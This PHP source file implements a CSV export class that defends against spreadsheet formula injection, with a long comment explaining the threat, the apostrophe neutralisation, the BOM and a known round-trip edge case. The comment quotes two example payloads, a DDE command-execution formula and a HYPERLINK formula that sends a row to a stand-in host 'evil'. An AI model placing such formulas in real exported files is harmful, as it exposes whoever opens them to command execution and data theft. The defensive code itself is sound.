<?php

namespace App\Support;

use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * The ONE CSV writer. There was none before P1c, which makes this the one chance to get
 * formula-injection neutralisation right rather than retrofit it.
 *
 * THE THREAT. A cell beginning `=`, `+`, `-`, `@`, TAB or CR is executed as a formula by Excel,
 * LibreOffice and Google Sheets when the file is opened. `=cmd|'/c calc'!A1` and
 * `=HYPERLINK("http://evil/?"&A1)` are the classic shapes; the second exfiltrates the row it
 * sits in with one click on a "this file contains links" prompt. A hospital spreadsheet imported
 * into this system and exported again is exactly the round trip that carries an attacker-authored
 * cell from one operator's machine to another's (P1 plan, P1c item 14).
 *
 * THE NEUTRALISATION is a single leading apostrophe — the only one that survives all three
 * applications. `App\Support\Roster\CsvRosterReader` strips exactly one leading apostrophe from
 * any cell that would otherwise begin with a dangerous character, so export -> re-import is
 * lossless. Ship the two together or a round trip renames every affected cell, once per trip.
 * CsvInjectionTest asserts the pairing rather than describing it.
 *
 * THE BOM is not decoration. Without it Excel decodes UTF-8 as the system codepage and Arabic
 * names open as mojibake, which reads as data corruption rather than an encoding default.
 *
 * THE PAIRING IS NOT A TRUE INVERSE (review minor 13), for one genuine value: a cell that
 * ALREADY starts with an apostrophe immediately followed by a dangerous character — `'=90kg`,
 * say. `neutralise()` leaves it untouched (its first character, `'`, is not itself dangerous),
 * so it round-trips through THIS export unchanged and is safe if opened directly in Excel
 * (a leading apostrophe is Excel's own "treat as text" marker). But `CsvRosterReader::
 * unNeutralise()` cannot tell that apostrophe apart from one THIS class added, and strips it —
 * one re-import turns `'=90kg` into `=90kg`, silently and permanently (a second export/import
 * re-neutralises `=90kg` back to `'=90kg`, so every FILE this system produces stays
 * individually Excel-safe; what is lost is the original DATA, not safety). NOT an execution
 * risk — `CsvInjectionTest::test_a_genuine_leading_apostrophe_before_a_dangerous_character_is_not_a_true_inverse`
 * pins the exact behaviour rather than leaving it as a surprise for whoever notices the data
 * drift later.
 */
final class Csv
{
    private const DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    public static function neutralise(?string $value): string
    {
        $value = (string) $value;

        if ($value === '') {
            return '';
        }

        return in_array($value[0], self::DANGEROUS_PREFIXES, true) ? "'".$value : $value;
    }

    /**
     * @param  list<string>  $headers
     * @param  iterable<array<int, string|int|float|null>>  $rows
     */
    public static function stream(string $filename, array $headers, iterable $rows): StreamedResponse
    {
        return response()->streamDownload(function () use ($headers, $rows): void {
            $out = fopen('php://output', 'w');

            fwrite($out, "\xEF\xBB\xBF");
            // `escape: ''` (review minor 11): PHP 8.4 deprecates the implicit `\` escape
            // parameter, and the default is not merely deprecated but ACTIVELY WRONG for a cell
            // ending in a backslash — PHP's escape mechanism reads the backslash immediately
            // before the closing quote as escaping the quote itself, so the parser continues
            // PAST the intended field boundary into whatever follows. RFC 4180 has no escape
            // character at all, only doubled enclosures, which fputcsv still does correctly with
            // escape disabled — `CsvInjectionTest::test_a_cell_ending_in_a_backslash_round_trips`
            // pins this. `App\Support\Roster\CsvRosterReader` must pass the same empty escape or
            // the pairing breaks on the read side instead.
            fputcsv($out, array_map(self::neutralise(...), $headers), escape: '');

            foreach ($rows as $row) {
                fputcsv($out, array_map(fn ($cell): string => self::neutralise(
                    $cell === null ? '' : (string) $cell
                ), $row), escape: '');
            }

            fclose($out);
        }, $filename, ['Content-Type' => 'text/csv; charset=UTF-8']);
    }
}
